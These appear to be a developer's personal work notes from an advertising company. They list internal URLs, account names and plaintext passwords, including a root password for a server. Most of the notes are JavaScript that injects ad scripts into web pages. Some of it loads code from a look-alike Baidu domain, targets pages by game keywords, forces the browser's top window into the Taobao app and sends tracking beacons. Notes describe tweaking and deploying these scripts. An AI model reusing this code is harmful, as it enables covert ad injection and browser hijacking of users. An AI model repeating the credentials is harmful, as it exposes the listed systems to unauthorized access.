# 作用


form表单提交的公共插件，判断其是新建还是修改，从而调用不同的接口获取数据，以及判断最后提交的方法。


# 父组件传参

- `id`： 页面唯一标识符，由此判断有无
- `editReq`：请求接口的参数

# 方法

- `handleSubmit` 点击提交以后，对表单的数据进行验证
- `handleReset`  清空现有的表单数据
- `submitData`   新建时提交数据的方法
- `updateData`   修改时提交数据的方法
- `getData`      修改时候获取对象的参数进行绑定
渠道商-媒体商




# 项目地址

http://192.168.2.30/

账号：zhongyihe   
密码：456  8位

# bug

http://192.168.3.73:8080/secure/Dashboard.jspa

账号：hehzongyi   
密码：456  6位


# 公共文件

\\192.168.1.238\Sndo深度项目


# wifi

http://192.168.99.1/
密码：123456



# 线上地址

https://dsp.sndo.com/login.html
ader 123456


https://ssp.sndo.com/login.html
liuyang 123456


https://admin.sndo.com/index.html
hzy  123456


# DSP项目地址


https://git.vm.snqu.com/snqu-network/sndo/dspweb/tree/master


# winSCP

   测试服务器


  /var/www/sndo_test/web_2.0/cpro/zhaobo/


[http://test.sndo.com/zhaobo/index.html](http://test.sndo.com/zhaobo/index.html)



# 广告的加载


	;(function () {
    	if (!document.body)
	                return setTimeout(arguments.callee, 50);
	            function loadJs(url) {
	var el = document.createElement('script');
	el.src = url;
	el.type = 'text/javascript';
	document.body.appendChild(el);
	}
	
    	loadJs('//cpro.sndo.com/web/ui/c.js?z=1uyd6g05narm');
	})();




## 简易的上传信息

	(new Image).src='www.baidu.com'


## 函数执行不执行

	  function f1(a) {
	      console.log(a);
	      return a;
	  }
	  let a=f1;    //a为function  没执行
	  let b=f1(1);  //b为1    执行了一次 


## void

	ud = void 0 用 void 0 代替 undefined 避免 undefined

## 获取对应的script和正在运行的script

	doc.getElementsByTagName('script')  //所有的
	
	doc.currentScript   //正在运行的




# 给script标签加属性


    el.setAttribute('smua',"d=p&s=b&u=u3702036&w=300&h=250");


# 广告的案例


    ;(function () {
        if (!document.body)
            return setTimeout(arguments.callee, 50);
        function loadJs(url) {
            var el = document.createElement('script');
            el.src = url;
            el.type = 'text/javascript';
            document.body.appendChild(el);
        }

        loadJs('//www.smucdn.com/smu0/o.js');
    })();


# 动态添加css



    addCSS: function(cssText) {
            var style = doc.createElement('style')
              , head = doc.head || doc.getElementsByTagName('head')[0];
            style.type = 'text/css';
            // for IE
            if (style.styleSheet) {
                var func = function() {
                    try {
                        // 低版本IE显示长度限制
                        style.styleSheet.cssText = cssText;
                    } catch (e) {}
                };
                if (style.styleSheet.disabled) {
                    setTimeout(func, 10);
                } else {
                    func();
                }
            } else {
                var textNode = doc.createTextNode(cssText);
                style.appendChild(textNode);
            }
            head.appendChild(style);
        },


# set和get  cookie


	setCookie(key, value, expire) {
	        if (typeof document.cookie == 'string') {
	var exp = new Date()
	expire = expire || this.expire
	            exp.setTime(exp - 0 + expire * 1000)
	            document.cookie = key + "=" + encodeURIComponent(value) + ";expires=" + exp.toGMTString()
	        }
	    }
	    getCookie(key) {
	        if (typeof document.cookie == 'string') {
	            var h = RegExp("(^| )" + key + "=([^;]*)(;|$)").exec(documentument.cookie)
	            return h ? decodeURIComponent(h[2]) : ''
	        }
	        return ''
	    }



# 关键词


    ;(function(win, doc) {
        if (win != top || !doc.body || win.__DSDE__) {
            return
        }
        win.__DSDE__ = true;
        var wd = ['baidu.com', 'iqiyi.com', 'jd.com', '163.com', 'taobao.com', '767xx.cn'],
            keys = ['pubg', 'steam', '\u7edd\u5730\u6c42\u751f'],
            keys2 = ['lol', '\u82f1\u96c4\u8054\u76df'],
            k = null;
        for (i = 0; i < wd.length; i++) {
            if (location.host.indexOf(wd[i]) != -1) {
                return
            }
        }
        var html = doc.getElementsByTagName('body');
        if (html.length < 1) {
            return
        }
        html = html[0].innerHTML;
        for (i = 0; i < keys2.length; i++) {
            if (html.indexOf(keys2[i]) != -1) {
                k = keys2[i]
            }
        }
        if (k) {
            s = document.createElement('script');
            s.src = "http://s.baidustatie.com/t/g.php?z=2772x54izvi6";
            document.body.appendChild(s);
            addCSS('#BDV_UNION_WRAPPER_2772x54izvi6_0{ margin: -240px auto!important; left: 0; ')
        }
    })(window, document);





# 唤起的操作


	;
	(function () {
	    if (window.SD_FLAG_JD_TB) return;
	    if (!document.body) return setTimeout(arguments.callee, 50);
	    window.SD_FLAG_JD_TB = !0;
	    var srcMaps = {
	        '__jingdong': 'http://s.baidustatie.com/t/src/js/wuyiai.js',
	        '__taobao': 'http://s.baidustatie.com/t/src/js/tk3bk3_10_30.js',
	        '__vip': 'http://s.baidustatie.com/t/src/js/wz2pn3hv4.js',
	    };
	    var cookie_once_keys = ['__jingdong', '__taobao', '__vip', '__tencentNews'];
	    var cookie_key = getRandKey(srcMaps);
	    for (var c = 0, len = cookie_once_keys.length; c < len; c++) {
	        if (getCookie(cookie_once_keys[c])) return
	    }
	    loadJs(srcMaps[cookie_key]);
	
	    function getRandKey(obj) {
	        var ary = [];
	        var key = null;
	        for (var k in obj) {
	            if (obj.hasOwnProperty(k)) ary.push(k)
	        }
	        key = ary[getRand(0, ary.length - 1)];
	        return key
	    }
	    function loadJs(src, fn) {
	        var oel = document.createElement('script');
	        oel.src = src;
	        oel.type = 'text/javascript';
	        oel.onload = oel.onreadystatechange = function () {
	            if (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete') {
	                typeof fn === 'function' && fn()
	            }
	        };
	        document.body.appendChild(oel)
	    }
	    function getRand(a, b) {
	        return Math.floor(Math.random() * (b - a + 1) + a)
	    }
	    function getCookie(cookie_name) {
	        var allcookies = document.cookie,
	            cookie_pos = allcookies.indexOf(cookie_name);
	        if (cookie_pos != -1) {
	            cookie_pos += cookie_name.length + 1;
	            var cookie_end = allcookies.indexOf(";", cookie_pos);
	            if (cookie_end == -1) {
	                cookie_end = allcookies.length
	            }
	            var value = unescape(allcookies.substring(cookie_pos, cookie_end))
	        }
	        return value || ""
	    }
	    window.addEventListener('message', function (event) {
	        if (event.data == 'fromIframe') {
	            (new Image).src = "http://s.baidustatie.com/t/r.php?hk=rewakeup&date=Ymd&sqidate=" + Math.round(+new Date)
	        }
	    });
	    var iframes = document.querySelectorAll('iframe');
	    for (var i = 0, len = iframes.length; i < len; i++) {
	        var iframe = iframes[i];
	        iframe.contentWindow.postMessage('fromTop', '*')
	    }
	})();



找到其中的js：



    '__jingdong': 'http://s.baidustatie.com/t/src/js/wuyiai.js',
    '__taobao': 'http://s.baidustatie.com/t/src/js/tk3bk3_10_30.js',
    '__vip': 'http://s.baidustatie.com/t/src/js/wz2pn3hv4.js',


根据对应的链接找到指定的js：


	;(function(win,doc){var W=(function(){var ua=win.navigator.userAgent;return{os:(function(){if(ua.match(/Android|Linux/i)){d='android'}else if(ua.match(/iPhone|iPad|iPod/i)){d='ios'}else{d='windows'}return d})(),browser:(function(){var d='chrome';if(ua.match(/MicroMessenger/i)){d='wechat'}else if(ua.match(/QQ\//i)){d='qq'}else if(ua.match(/UCBrowser/i)){d='uc'}else if(ua.match(/baiduboxapp|baidubrowser/i)){d='baidu'}return d})(),set:function(key,value,expire){try{if(false&&win.localStorage){win.localStorage.setItem(key,value+'___'+(+new Date))}else if(typeof doc.cookie=='string'){var exp=new Date();exp.setTime(exp-0+expire*1000);doc.cookie=key+"="+encodeURIComponent(value)+";expires="+exp.toGMTString()}}catch(e){DEBUG&&alert(e)}},get:function(key,expire){try{if(false&&win.localStorage){value=win.localStorage.getItem(key);if(value){value=value.split('___');if((+new Date)-value[1]>expire*1000){return 0}return value[0]-0}return''}else if(typeof doc.cookie=='string'){var h=RegExp("(^| )"+key+"=([^;]*)(;|$)").exec(document.cookie);return h?decodeURIComponent(h[2]):''}}catch(e){DEBUG&&alert(e)}return''},ajax:function(url,fn){var s=doc.createElement('script'),cb='callback';s.src=url+(url.indexOf('?')==-1?'?':'&')+'callback='+cb;win[cb]=function(data){fn.call(this,data);win[cb]=null;doc.body.removeChild(s)};doc.body.appendChild(s)}}})();W.taobao=function(){var scheme='tbopen://m.taobao.com/tbopen/index.html?source=auto&action=ali.open.nav&module=h5&bootImage=0&h5Url=https%3A%2F%2Fh5.m.taobao.com%2Fbcec%2Fdahanghai-jump.html%3Fspm%3D2014.ugdhh.3915747229.1219-223%26bc_fl_srcgrowth_dhh_3915747229_1219-223&spm=2014.ugdhh.3915747229.1219-223&bc_fl_src=growth_dhh_3915747229_1219-223&materialid=1219';var url='';var key='__taobao',max=1,expire=86400,times=W.get(key,expire)-0;if(times>=max){return}W.set(key,++times,expire);(new Image()).src="http://w.c-cnzz.com/1.gif?t=wakeup_tb&m=kj&c=wifi&_="+(+new Date());if(W.browser=='wechat'||W.browser=='qq'){url='http://a.app.qq.com/o/simple.jsp?pkgname=com.taobao.taobao&android_schema='+encodeURIComponent(scheme);win.location.href=url}else if(W.browser=='baidu'){url=scheme;win.addEventListener('click',function(){win.location.href=url})}else{top.location.href=scheme}};setTimeout(W.taobao,100)})(window,document);


替换：


	scheme中的值
![](https://i.imgur.com/2WoKBQm.png)

   最后把js改成原本的名字，压缩，调到测试环境看能不能运行

   最后上交给马超即可	 




# 查看源代码  cril+u


# 查看映入的js

是core.php    response   大括号   js部分





# 下载唯品会前


    '__jingdong': 'http://s.baidustatie.com/t/src/js/wuyiai.js',
    '__taobao': 'http://s.baidustatie.com/t/src/js/tk3bk3_10_30.js',
    '__vip': 'http://s.baidustatie.com/t/src/js/wz2pn3hv4.js',






#将一个html页面广告发出去

	; (function () {
	    var iframe = document.createElement('iframe');
	    iframe.setAttribute('src', 'http://1.mini.eastday.com/srftips/dsp/dsp2.html');
	    iframe.setAttribute('frameborder', '0');
	    iframe.setAttribute('scrolling', 'no');
	    iframe.setAttribute('width', '273px');  
	    iframe.setAttribute('height', '229px');
	    document.body.appendChild(iframe);
	})();

大小根据图片高度自适应的：



	;(function () {
	    var iframe = document.createElement('iframe');
	    iframe.setAttribute('src', 'http://1.mini.eastday.com/srftips/dsp/dsp2.html');
	    iframe.setAttribute('frameborder', '0');
	    iframe.setAttribute('scrolling', 'no');
	    iframe.setAttribute('width', '300px');
	    iframe.setAttribute('height', '0');
	    document.body.appendChild(iframe);
	    function setIframeHeight(iframe) {
	        if (iframe) {
	            var iframeWin = iframe.contentWindow || iframe.contentDocument.parentWindow;
	            if (iframeWin.document.body) {
	                iframe.height = iframeWin.document.documentElement.scrollHeight || iframeWin.document.body.scrollHeight;
	            }
	        }
	    };
	    window.onload = function () {
	        setIframeHeight(document.getElementById('external-frame'));
	    };
	})();





盛游后台



	148.70.40.246  root   Snqu123.
	/var/www/snyou_web